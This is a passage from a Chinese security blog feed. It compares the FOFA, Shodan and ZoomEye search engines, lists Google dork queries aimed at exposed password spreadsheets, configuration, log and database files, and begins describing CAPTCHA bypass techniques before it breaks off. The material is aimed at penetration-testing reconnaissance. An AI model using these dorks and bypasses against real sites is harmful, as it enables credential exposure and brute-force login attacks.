host=”gov.cn”<br>新增==完全匹配的符号，可以加快搜索速度，<br>比如查找qq.com所有host，可以是domain==”qq.com”</p><h5 id="3-API调用"><a href="#3-API调用" class="headerlink" title="3 API调用"></a>3 API调用</h5><blockquote><p><a href="https://fofa.so/api/v1/search/all?email={user}&amp;key={token}&amp;qbase64={dork}&amp;fields={resource}&amp;page={page}" target="_blank" rel="noopener">https://fofa.so/api/v1/search/all?email={user}&amp;key={token}&amp;qbase64={dork}&amp;fields={resource}&amp;page={page}</a></p></blockquote><h6 id="查询接口"><a href="#查询接口" class="headerlink" title="查询接口"></a>查询接口</h6><p>输入下列请求所需的qbase64，返回json数据格式</p><table><thead><tr><th>字段名</th><th>类型</th><th>内容</th></tr></thead><tbody><tr><td>qbase64</td><td>string</td><td>经过base64编码后的查询语法，支持domain,host,ip,header,body,title，运算符支持== = != =~</td></tr><tr><td>page</td><td>integer</td><td>每页返回记录数，普通用户默认为10000条，vip用户默认为100条，最大可设置为10000条</td></tr><tr><td>size</td><td>integer</td><td>每页返回记录数，普通用户默认为10000条，vip用户默认为100条，最大可设置为10000条</td></tr><tr><td>fields</td><td>string</td><td>【可选参数】字段列表，默认为host，用逗号分隔多个参数，如(fields=ip,title)，可选的列表有：host title ip domain port country province city country_name header server protocol banner cert isp as_number as_organization latitude longitude lastupdatetime注意：country是国家代码，例如CN, country_name是国家名称</td></tr><tr><td>full</td><td>boolean</td><td>默认为false，是否搜索全部数据，默认和页面搜索一样,只能搜索一年内的数据，指定为true搜索全部数据</td></tr></tbody></table><h6 id="接口返回"><a href="#接口返回" class="headerlink" title="接口返回"></a>接口返回</h6><table><thead><tr><th>字段名</th><th>类型</th><th>内容</th></tr></thead><tbody><tr><td>mode</td><td>string</td><td>查询模式：mode返回为”normal”代表普通查询(q=words)，mode返回为”extended”代表高级查询(如q=domain=fofa.so,q=title=fofa,采用高级条件搜索)</td></tr><tr><td>page</td><td>integer</td><td>当前请求页的页数</td></tr><tr><td>size</td><td>integer</td><td>请求返回结果的个数</td></tr><tr><td>results</td><td>array</td><td>请求返回结果的详情数组</td></tr></tbody></table><p><strong>返回示例</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># 正确返回结果</span><br><span class="line">&#123; </span><br><span class="line">    &quot;mode&quot;: &quot;extended&quot;, </span><br><span class="line">    &quot;error&quot;: null, </span><br><span class="line">    &quot;query&quot;: &quot;domain=\&quot;nosec.org\&quot;\n&quot;,</span><br><span class="line">    &quot;page&quot;: 1, </span><br><span class="line">    &quot;size&quot;: 6,</span><br><span class="line">    &quot;results&quot;: </span><br><span class="line">    [</span><br><span class="line">        [ &quot;https://i.nosec.org&quot; ],</span><br><span class="line">        [ &quot;https://nosec.org&quot; ],</span><br><span class="line">        [ &quot;down3.nosec.org&quot; ], </span><br><span class="line">        [ &quot;www.nosec.org&quot; ],</span><br><span class="line">        [ &quot;nosec.org&quot; ],</span><br><span class="line">        [ &quot;cdn.nosec.org&quot; ]</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#错误返回</span><br><span class="line">&#123; </span><br><span class="line">    &quot;error&quot;: true,</span><br><span class="line">    &quot;errmsg&quot;: &quot;401 Unauthorized, make sure email and apikey is correct.&quot; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="4-代码实现"><a href="#4-代码实现" class="headerlink" title="4 代码实现"></a>4 代码实现</h5><p><img src="http://qiniu.austfish.cn/blog/20200611/R0DI5rXF8lyn.png?imageslim" alt="mark"></p><p><img src="http://qiniu.austfish.cn/blog/20200611/bThzUN43Yiwk.png?imageslim" alt="mark"></p><h4 id="0×04-SHODAN搜索引擎"><a href="#0×04-SHODAN搜索引擎" class="headerlink" title="0×04 SHODAN搜索引擎"></a>0×04 SHODAN搜索引擎</h4><h5 id="1-概述-1"><a href="#1-概述-1" class="headerlink" title="1 概述"></a>1 概述</h5><p>Shodan是一个搜索互联网连接设备的搜索引擎，不同于谷歌、必应、百度这些搜索引擎。用户可以在Shodan上使用Shodan搜索语法查找连接到互联网的摄像头、路由器、服务器等设备信息。在渗透测试中，是个很不错的神器。</p><h5 id="2-查询语法-1"><a href="#2-查询语法-1" class="headerlink" title="2 查询语法"></a>2 查询语法</h5><table><thead><tr><th>字段</th><th>解释</th><th>例子</th></tr></thead><tbody><tr><td>hostname</td><td>搜索指定的主机或域名</td><td>hostname:”sina.com”</td></tr><tr><td>port</td><td>搜索指定的端口</td><td>port:”80”</td></tr><tr><td>country</td><td>搜索指定的国家</td><td>country:”China”</td></tr><tr><td>city</td><td>搜索指定的城市</td><td>city:”Beijing”</td></tr><tr><td>product</td><td>搜索指定的操作系统/软件</td><td>product:”apache”</td></tr><tr><td>version</td><td>搜索指定的软件版本</td><td>version:”7.1.4”</td></tr><tr><td>net</td><td>搜索指定的IP地址或子网</td><td>net:”117.44.67.0/24”</td></tr></tbody></table><h5 id="3-API调用-1"><a href="#3-API调用-1" class="headerlink" title="3 API调用"></a>3 API调用</h5><blockquote><p>HTTPS ：//api.shodan.io/shodan/host/search?key={YOUR_API_KEY}&amp;query={query}&amp;facets={facets}</p></blockquote><p><strong>key</strong></p><p>注册账号，获得API Key</p><p><strong>query</strong></p><p>Shodan搜索查询。<br>所提供的字符串用于搜索Shodan中的标语数据库，并带有附加选项以使用“ filter：value”格式在搜索查询中提供过滤器。<br>例如，以下搜索查询将找到位于德国的Apache Web服务器：”apache country：DE”。<br>当前支持以下过滤器：</p><p><img src="http://qiniu.austfish.cn/blog/20200611/lfCyinn46fg3.png?imageslim" alt="mark"><br><img src="http://qiniu.austfish.cn/blog/20200611/BDq2hxXWgwCn.png?imageslim" alt="mark"><br><img src="http://qiniu.austfish.cn/blog/20200611/CHspwK3B5pz6.png?imageslim" alt="mark"></p><p><strong>facets</strong></p><p>用逗号分隔的属性列表，以获取摘要信息。属性名称也可以采用”property：count”的格式，其中”count”是将为属性返回的构面数（即”country：100”将获得搜索查询的前100个国家/地区）。当前支持以下方面：<br><img src="http://qiniu.austfish.cn/blog/20200611/hHNjmGmwOaLi.png?imageslim" alt="mark"><br><img src="http://qiniu.austfish.cn/blog/20200611/UsqoPzMqoEz7.png?imageslim" alt="mark"><br><img src="http://qiniu.austfish.cn/blog/20200611/FUJ5RqBH7O1u.png?imageslim" alt="mark"></p><p><strong>返回例子</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"> &quot;matches&quot;: [</span><br><span class="line">  &#123;</span><br><span class="line">   &quot;os&quot;: null,</span><br><span class="line">   &quot;timestamp&quot;: &quot;2014-01-15T05:49:56.283713&quot;,</span><br><span class="line">   &quot;isp&quot;: &quot;Vivacom&quot;,</span><br><span class="line">   &quot;asn&quot;: &quot;AS8866&quot;,</span><br><span class="line">   &quot;hostnames&quot;: [ ],</span><br><span class="line">   &quot;location&quot;: &#123;</span><br><span class="line">    &quot;city&quot;: null,</span><br><span class="line">    &quot;region_code&quot;: null,</span><br><span class="line">    &quot;area_code&quot;: null,</span><br><span class="line">    &quot;longitude&quot;: 25,</span><br><span class="line">    &quot;country_code3&quot;: &quot;BGR&quot;,</span><br><span class="line">    &quot;country_name&quot;: &quot;Bulgaria&quot;,</span><br><span class="line">    &quot;postal_code&quot;: null,</span><br><span class="line">    &quot;dma_code&quot;: null,</span><br><span class="line">    &quot;country_code&quot;: &quot;BG&quot;,</span><br><span class="line">    &quot;latitude&quot;: 43</span><br><span class="line">   &#125;,</span><br><span class="line">   &quot;ip&quot;: 3579573318,</span><br><span class="line">   &quot;domains&quot;: [ ],</span><br><span class="line">   &quot;org&quot;: &quot;Vivacom&quot;,</span><br><span class="line">   &quot;data&quot;: &quot;@PJL INFO STATUS CODE=35078 DISPLAY=&quot;Power Saver&quot; ONLINE=TRUE &quot;,</span><br><span class="line">   &quot;port&quot;: 9100,</span><br><span class="line">   &quot;ip_str&quot;: &quot;213.91.244.70&quot;</span><br><span class="line">  &#125;,</span><br><span class="line">  ...</span><br><span class="line"> ],</span><br><span class="line"> &quot;facets&quot;: &#123;</span><br><span class="line">  &quot;org&quot;: [</span><br><span class="line">   &#123;</span><br><span class="line">    &quot;count&quot;: 286,</span><br><span class="line">    &quot;value&quot;: &quot;Korea Telecom&quot;</span><br><span class="line">   &#125;,</span><br><span class="line">   &#123;</span><br><span class="line">    &quot;count&quot;: 229,</span><br><span class="line">    &quot;value&quot;: &quot;Comcast Cable&quot;</span><br><span class="line">   &#125;,</span><br><span class="line">   &#123;</span><br><span class="line">    &quot;count&quot;: 113,</span><br><span class="line">    &quot;value&quot;: &quot;Taiwan Academic Network&quot;</span><br><span class="line">   &#125;,</span><br><span class="line">   &#123;</span><br><span class="line">    &quot;count&quot;: 107,</span><br><span class="line">    &quot;value&quot;: &quot;University of Minnesota&quot;</span><br><span class="line">   &#125;,</span><br><span class="line">   &#123;</span><br><span class="line">    &quot;count&quot;: 104,</span><br><span class="line">    &quot;value&quot;: &quot;Tiawan Academic Network (TANet) Information Center&quot;</span><br><span class="line">   &#125;</span><br><span class="line">  ]</span><br><span class="line"> &#125;,</span><br><span class="line"> &quot;total&quot;: 12039&#125;</span><br></pre></td></tr></table></figure><h5 id="4-代码调用"><a href="#4-代码调用" class="headerlink" title="4 代码调用"></a>4 代码调用</h5><p><strong>常用 Shodan 库函数</strong></p><ul><li>shodan.Shodan(key) ：初始化连接API</li><li>Shodan.count(query, facets=None)：返回查询结果数量</li><li>Shodan.host(ip, history=False)：返回一个IP的详细信息</li><li>Shodan.ports()：返回Shodan可查询的端口号</li><li>Shodan.protocols()：返回Shodan可查询的协议</li><li>Shodan.services()：返回Shodan可查询的服务</li><li>Shodan.queries(page=1, sort=’timestamp’, order=’desc’)：查询其他用户分享的查询规则</li><li>Shodan.scan(ips, force=False)：使用Shodan进行扫描，ips可以为字符或字典类型</li><li>Shodan.search(query, page=1, limit=None, offset=None, ufacets=None, minify=True)：查询Shodan数据</li></ul><h4 id="0×04-ZOOMEYE搜索引擎"><a href="#0×04-ZOOMEYE搜索引擎" class="headerlink" title="0×04 ZOOMEYE搜索引擎"></a>0×04 ZOOMEYE搜索引擎</h4><h5 id="1-概述-2"><a href="#1-概述-2" class="headerlink" title="1 概述"></a>1 概述</h5><p>ZoomEye 平台为广大网络研究爱好者和极客们提供了强大的 Restful API，通过它能够更好的与平台相连接，使用ZoomEye 平台提供的资源, 构建有意思的应用。 所以尽情发挥你的想象力吧，精彩的网络空间，等待你去探索。</p><h5 id="2-查询语法-2"><a href="#2-查询语法-2" class="headerlink" title="2 查询语法"></a>2 查询语法</h5><blockquote><p><a href="https://api.zoomeye.org/{}/search?query={}&amp;page={}&amp;facet={}&quot;" target="_blank" rel="noopener">https://api.zoomeye.org/{}/search?query={}&amp;page={}&amp;facet={}&quot;</a></p></blockquote><table><thead><tr><th>名称</th><th>类型</th><th>说明</th><th>是否必须</th><th>示例</th></tr></thead><tbody><tr><td>query</td><td>string</td><td>查询关键词</td><td>必须</td><td>port:80 nginx</td></tr><tr><td>page</td><td>integer</td><td>翻页参数（默认为1）</td><td>可选</td><td>7</td></tr><tr><td>facets</td><td>string</td><td>统计项目。如果为多个，使用逗号分隔各个统计项</td><td>可选</td><td>app,device</td></tr></tbody></table><h5 id="3-API调用-2"><a href="#3-API调用-2" class="headerlink" title="3 API调用"></a>3 API调用</h5><p><strong>主机设备搜索过滤器</strong></p><table><thead><tr><th>名称</th><th>类型</th><th>说明</th><th>示例</th></tr></thead><tbody><tr><td>app</td><td>string</td><td>应用，产品</td><td>app: ProFTD</td></tr><tr><td>ver</td><td>string</td><td>版本</td><td>ver:2.1</td></tr><tr><td>device</td><td>string</td><td>设备类型</td><td>device:router</td></tr><tr><td>os</td><td>string</td><td>操作系统</td><td>os:windows</td></tr><tr><td>service</td><td>string</td><td>服务类型</td><td>service:http</td></tr><tr><td>ip</td><td>string</td><td>IP 地址</td><td>ip:192.168.1.1</td></tr><tr><td>cidr</td><td>string</td><td>CIDR 格式地址</td><td>cidr:192.168.1.1/24</td></tr><tr><td>hostname</td><td>string</td><td>主机名称</td><td>hostname:google.com</td></tr><tr><td>port</td><td>string</td><td>端口号</td><td>port:80</td></tr><tr><td>city</td><td>string</td><td>城市名称</td><td>city:beijing</td></tr><tr><td>country</td><td>string</td><td>国家名称</td><td>country:china</td></tr><tr><td>asn</td><td>string</td><td>ASN 号码</td><td>asn:8978</td></tr></tbody></table><p><strong>Web 应用搜索过滤器</strong></p><table><thead><tr><th>名称</th><th>类型</th><th>说明</th><th>示例</th></tr></thead><tbody><tr><td>app</td><td>string</td><td>Web 应用信息</td><td>webapp:wordpres</td></tr><tr><td>header</td><td>string</td><td>HTTP headers</td><td>header:server</td></tr><tr><td>keywords</td><td>string</td><td>meta 属性关键词</td><td>keywords:baidu.com</td></tr><tr><td>desc</td><td>string</td><td>HTTP description 属性</td><td>desc:hello</td></tr><tr><td>title</td><td>string</td><td>HTTP Title 标题信息</td><td>title: baidu</td></tr><tr><td>ip</td><td>string</td><td>IP 地址</td><td>ip:192.168.1.1</td></tr><tr><td>site</td><td>string</td><td>site 搜索</td><td>site:baidu.com</td></tr><tr><td>city</td><td>string</td><td>城市名称</td><td>city:beijing</td></tr><tr><td>country</td><td>string</td><td>国家名称</td><td>country:china</td></tr></tbody></table><p><strong>返回值</strong></p><table><thead><tr><th>名称</th><th>类型</th><th>说明</th></tr></thead><tbody><tr><td>matches</td><td>string</td><td>结果集</td></tr><tr><td>facets</td><td>string</td><td>统计结果</td></tr><tr><td>total</td><td>string</td><td>结果总数</td></tr></tbody></table><p><strong>响应示例</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&#123; &quot;matches&quot;: [ &#123;</span><br><span class="line">    &quot;geoinfo&quot;: &#123;</span><br><span class="line">        &quot;asn&quot;: 45261,</span><br><span class="line">        &quot;city&quot;: &#123;</span><br><span class="line">            &quot;names&quot;: &#123;</span><br><span class="line">                &quot;en&quot;: &quot;Brisbane&quot;,</span><br><span class="line">                &quot;zh-CN&quot;: &quot;\u5e03\u91cc\u65af\u73ed&quot;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;continent&quot;: &#123;</span><br><span class="line">            &quot;code&quot;: &quot;OC&quot;,</span><br><span class="line">            &quot;names&quot;: &#123;</span><br><span class="line">                &quot;en&quot;: &quot;Oceania&quot;,</span><br><span class="line">                &quot;zh-CN&quot;: &quot;\u5927\u6d0b\u6d32&quot;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;country&quot;: &#123;</span><br><span class="line">            &quot;code&quot;: &quot;AU&quot;,</span><br><span class="line">            &quot;names&quot;: &#123;</span><br><span class="line">                &quot;en&quot;: &quot;Australia&quot;,</span><br><span class="line">                &quot;zh-CN&quot;: &quot;\u6fb3\u5927\u5229\u4e9a&quot;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;location&quot;: &#123;</span><br><span class="line">            &quot;lat&quot;: -27.471,</span><br><span class="line">            &quot;lon&quot;: 153.0243</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;ip&quot;: &quot;192.168.1.1&quot;,</span><br><span class="line">    &quot;portinfo&quot;: &#123;</span><br><span class="line">        &quot;app&quot;: &quot;&quot;,</span><br><span class="line">        &quot;banner&quot;: &quot;+OK Hello there.\r\n-ERR Invalid command.\r\n\n&quot;,</span><br><span class="line">        &quot;device&quot;: &quot;&quot;,</span><br><span class="line">        &quot;extrainfo&quot;: &quot;&quot;,</span><br><span class="line">        &quot;hostname&quot;: &quot;&quot;,</span><br><span class="line">        &quot;os&quot;: &quot;&quot;,</span><br><span class="line">        &quot;port&quot;: 110,</span><br><span class="line">        &quot;service&quot;: &quot;&quot;,</span><br><span class="line">        &quot;version&quot;: &quot;&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;timestamp&quot;: &quot;2016-03-09T16:14:04&quot;</span><br><span class="line">    &#125;, ... ...],</span><br><span class="line">   &quot;facets&quot;: &#123;</span><br><span class="line">   &#125;,</span><br><span class="line">    &quot;total&quot;: 28731397</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>HOST固定属性</strong><br><img src="http://qiniu.austfish.cn/blog/20200611/mUe8Bpfa2R6f.png?imageslim" alt="mark"></p><p><strong>WEB固定属性</strong><br><img src="http://qiniu.austfish.cn/blog/20200611/OA1PU08eceUF.png?imageslim" alt="mark"><br><img src="http://qiniu.austfish.cn/blog/20200611/0sIAqpdVOKHk.png?imageslim" alt="mark"></p><h5 id="4-代码调用-1"><a href="#4-代码调用-1" class="headerlink" title="4 代码调用"></a>4 代码调用</h5><p><img src="http://qiniu.austfish.cn/blog/20200612/SJS9OC7cv0XF.png?imageslim" alt="mark"></p><h4 id="0×05-探测资产对比"><a href="#0×05-探测资产对比" class="headerlink" title="0×05 探测资产对比"></a>0×05 探测资产对比</h4><table><thead><tr><th>字段</th><th>说明</th><th>zoomeye</th><th>fofa</th><th>shodan</th></tr></thead><tbody><tr><td>ip</td><td>IP 地址</td><td>ip</td><td>ip</td><td>ip_str</td></tr><tr><td>asn</td><td>ASN 号</td><td>geoinfo.asn</td><td>as_number</td><td>asn</td></tr><tr><td>city</td><td>城市</td><td>geoinfo.city</td><td>city</td><td>location.city</td></tr><tr><td>province</td><td>省</td><td></td><td>province</td><td></td></tr><tr><td>country_code</td><td>国家码</td><td>geoinfo.country.code</td><td>country</td><td>location.country_code</td></tr><tr><td>country</td><td>国家名</td><td>geoinfo.country.name</td><td>country_name</td><td>location.country_name</td></tr><tr><td>continent_code</td><td>洲际码</td><td>geoinfo.continent.code</td><td></td><td></td></tr><tr><td>continent_name</td><td>洲际名</td><td>geoinfo.continent.name</td><td></td><td></td></tr><tr><td>latitude</td><td>纬度</td><td>geoinfo.location.latitude</td><td>latitude</td><td>location.latitude</td></tr><tr><td>longitude</td><td>经度</td><td>geoinfo.location.longitude</td><td>longitude</td><td>location.longitude</td></tr><tr><td>port</td><td>端口号</td><td>port</td><td>port</td><td>port</td></tr><tr><td>banner</td><td>端口指纹信息</td><td>banner</td><td>banner</td><td>data</td></tr><tr><td>server</td><td>产品名称</td><td>portinfo.app</td><td>server</td><td>product</td></tr><tr><td>hostname</td><td>主机名</td><td>portinfo.hostname</td><td>host</td><td>hostnames</td></tr><tr><td>os</td><td>操作系统名称</td><td>portinfo.os</td><td></td><td>os</td></tr><tr><td>version</td><td>产品，应用版本信息</td><td>portinfo.version</td><td></td><td></td></tr><tr><td>info</td><td>额外信息</td><td>portinfo.info</td><td></td><td></td></tr><tr><td>device</td><td>设备类型</td><td>portinfo.device</td><td></td><td>tags</td></tr><tr><td>title</td><td>标题</td><td></td><td>title</td><td></td></tr><tr><td>domain</td><td>域名</td><td></td><td>domain</td><td>domains</td></tr><tr><td>header</td><td>http头</td><td></td><td>header</td><td></td></tr><tr><td>protocol</td><td>协议</td><td></td><td>protocol</td><td>transport</td></tr><tr><td>cert</td><td>证书</td><td></td><td>cert</td><td></td></tr><tr><td>isp</td><td>互联网供应商</td><td></td><td>isp</td><td>isp</td></tr><tr><td>lastupdatetime</td><td>最后更新时间</td><td></td><td>lastupdatetime</td><td>timestamp</td></tr><tr><td>org</td><td>组织</td><td></td><td>as_organization</td><td>org</td></tr><tr><td></td><td>组织代码</td><td></td><td>as_number</td></tr></tbody></table>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Fofa、Shodan、Zoomeye网络空间搜索引擎测评。&lt;br&gt;
    
    </summary>
    
    
      <category term="工具" scheme="http://austfish.cn/tags/%E5%B7%A5%E5%85%B7/"/>
    
      <category term="调研" scheme="http://austfish.cn/tags/%E8%B0%83%E7%A0%94/"/>
    
  </entry>
  
  <entry>
    <title>Google_Hack语法</title>
    <link href="http://austfish.cn/2020/04/30/Google-Hack%E8%AF%AD%E6%B3%95/"/>
    <id>http://austfish.cn/2020/04/30/Google-Hack语法/</id>
    <published>2020-04-30T07:58:51.000Z</published>
    <updated>2022-02-18T03:34:20.676Z</updated>
    
    <content type="html"><![CDATA[<p>Google是一个伟大的信息收集工具。<br><a id="more"></a></p><h4 id="0×01-前言"><a href="#0×01-前言" class="headerlink" title="0×01 前言"></a>0×01 前言</h4><p><strong>验证码机制</strong></p><p>Google是一个伟大的信息收集工具，在如今的互联网时代，想想看一个人可以轻易的从搜索引擎中获取你详细的个人信息是件多么叫人激动又害怕的事情。Google也可以当作我们的第二个“社工库”。</p><h4 id="0×02-Google基本关键词"><a href="#0×02-Google基本关键词" class="headerlink" title="0×02 Google基本关键词"></a>0×02 Google基本关键词</h4><ul><li>Intext： 搜索出现的关键词</li><li>Inurl： 搜索包含关键词的url</li><li>Intitle： 搜索包含关键词的标题</li><li>Site： 搜索包含关键词的站点</li><li>filetype： 搜索包含关键词的文件类型</li><li>Link： 对于页面包含的外部链接搜索</li><li>Daterange： 搜索特定的日期范围</li></ul><h4 id="0×02-Google基本规则"><a href="#0×02-Google基本规则" class="headerlink" title="0×02 Google基本规则"></a>0×02 Google基本规则</h4><ul><li>Google 不分大小写</li><li>Google 可以使用通配符：*表示一个词/字</li><li>Google 会智能地保留一些内容，比如一些过时的词，一些不适合呈现的内容（比如违法信息）最常用的：”关键字” ，双引号会使Google强制搜索包含关键字的内容布尔操作符：AND(+) NOT(-) OR(|)，AND 现在已不需要，多个关键字google会都匹配到</li></ul><h4 id="0×03-常用示例"><a href="#0×03-常用示例" class="headerlink" title="0×03 常用示例"></a>0×03 常用示例</h4><p><strong>1、目录列表查找</strong><br>目录列表能列出存在于一个web服务器上的文件和目录<br>查找目录列表</p><blockquote><p>实例：<br>intitle:index.of 这里的休止符代表的是单个字母的通配符<br>更优化的查找<br>实例：<br>intitle:index.of “parent directory”<br>intitle:index.of name size</p></blockquote><p><strong>2、特定版本的服务器</strong><br>能被攻击者用来决定攻击web服务器最佳方法的一小段信息，就是确切的服务器版本</p><blockquote><p>实例：<br>intitle:index.of “server at”<br>intitle:index.of “Apache/1.3.27 Server at”</p></blockquote><p><strong>3、扩展遍历技术</strong><br>经常会出现web页面的备份文件，他们有泄露源码的倾向。常常在配置错误的时候出现这种问题，把php代码备份到不是以php结尾的文件中，比如bak</p><blockquote><p>实例：<br>intitle:index.of index.php.bak<br>inurl:index.php.bak</p></blockquote><p><strong>4、配置文件的查找</strong><br>配置文件的存在说明服务就在附近</p><blockquote><p>实例：<br>filetype:conf inurl:firewall<br>如果你能知道配置文件的名字也是一个非常好的搜索方式，当然你可以从配置文件中抽取特定的字符串来查询，如果能再配上软件名字的话就效果更好了</p></blockquote><p><strong>5、日志文件的查找</strong><br>日志文件中也记录着日志很多的敏感信息<br>日志文件也有一个默认的名字可以被我们用作基础的搜索，最常见的扩展名就是log了</p><blockquote><p>实例：<br>filetype:log inurl:log<br>ext log log<br>filetype:log username putty</p></blockquote><p><strong>6、office文档实例：</strong></p><blockquote><p>filetype:xls inurl:password.xls<br>filetype:xls username password email</p></blockquote><p><strong>7、登录入口</strong><br>登录入口是第一道防线，很容易泄露软硬件的信息<br>查找入口一般使用关键字login<br>大的厂商一般会把版权的注意事项放在页面的底部</p><blockquote><p>实例：<br>intitle:login intext:版权信息</p></blockquote><p><strong>8、错误消息</strong><br>数据库的错误消息能够用来分析操作系统和web服务器的版本，还可能更多<br>SQL command not properly ended<br>这个表示没有在sql语句的最后找到正确的终止符，所以可能会被用于注入攻击</p><p><strong>9、真实的数据库文件</strong><br>攻击者还能直接搜索到数据库本身，并不适合所有的数据库系统，只适合哪些有着特定名字或者扩展名的数据库,因为是二进制文件，所以没法在里面搜索字符</p><blockquote><p>实例：<br>filetype:mdb inurl:com</p></blockquote><h4 id="0×04-Google-hack导图"><a href="#0×04-Google-hack导图" class="headerlink" title="0×04 Google hack导图"></a>0×04 Google hack导图</h4><p><img src="http://qiniu.austfish.cn/blog/20200430/RQCinpQ773ap.png?imageslim" alt="mark"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Google是一个伟大的信息收集工具。&lt;br&gt;
    
    </summary>
    
    
      <category term="社工" scheme="http://austfish.cn/tags/%E7%A4%BE%E5%B7%A5/"/>
    
      <category term="工具" scheme="http://austfish.cn/tags/%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>验证码的姿势学习</title>
    <link href="http://austfish.cn/2020/04/30/%E9%AA%8C%E8%AF%81%E7%A0%81%E7%9A%84%E5%A7%BF%E5%8A%BF%E5%AD%A6%E4%B9%A0/"/>
    <id>http://austfish.cn/2020/04/30/验证码的姿势学习/</id>
    <published>2020-04-30T07:58:18.000Z</published>
    <updated>2022-02-18T03:34:22.800Z</updated>
    
    <content type="html"><![CDATA[<p>验证码怎么玩？<br><a id="more"></a></p><h4 id="0×01-前言"><a href="#0×01-前言" class="headerlink" title="0×01 前言"></a>0×01 前言</h4><p><strong>验证码机制</strong></p><ol><li>客户端发起请求</li><li>服务端响应并创建一个新的SessionID同时生成随机验证码，将验证码和SessionID一并返回给客户端</li><li>客户端提交验证码连同SessionID给服务端</li><li>服务端验证验证码同时销毁当前会话，返回给客户端结果。</li></ol><h4 id="0×02-客户端安全问题"><a href="#0×02-客户端安全问题" class="headerlink" title="0×02 客户端安全问题"></a>0×02 客户端安全问题</h4><ol><li>有的网站验证码由本地js生成仅仅在本地用js验证。可以在本地禁用js，用burp把验证字段删除。</li><li>有的网站把验证码输出到客户端html中，送到客户端Cookie或response headers。</li><li>有些网站默认不显示验证码，而是在输入错误一定数量之后才需要验证验证码，开发人员可能在Cookie中写入一个标记loginErr，用来记录错误数量，则可以不更新Cookie中的loginErr值反复提交，验证码就不会出现。</li></ol><h4 id="0×03-服务端安全问题"><a href="#0×03-服务端安全问题" class="headerlink" title="0×03 服务端安全问题"></a>0×03 服务端安全问题</h4><ol><li>验证码不过期，没有及时销毁会话导致同一验证码反复可用。攻击者可以在Cookie中带固定的sessionID和固定的验证码字符串。</li><li>没有对验证码进行非空判断，导致可以直接删除验证码参数。</li><li>产生的验证码问题有限</li></ol><h4 id="0×04-验证码问题汇总"><a href="#0×04-验证码问题汇总" class="headerlink" title="0×04 验证码问题汇总"></a>0×04 验证码问题汇总</h4><h5 id="4-1-验证码不刷新"><a href="#4-1-验证码不刷新" class="headerlink" title="4.1 验证码不刷新"></a>4.1 验证码不刷新</h5><p>导致验证码不刷新（固定）的原因是：登录密码错误之后，session中的值没有更新，验证码不变。验证码不刷新通常有以下两种情况：无条件不刷新、有条件不刷新。</p><p><strong>4.1.1 无条件不刷新</strong><br>无条件不刷新是指在某一时间段内，无论登录失败多少次，只要不刷新页面，就可以无限次的使用同一个验证码来对一个或多个用户帐号进行暴力猜解。</p><blockquote><p>【测试案例 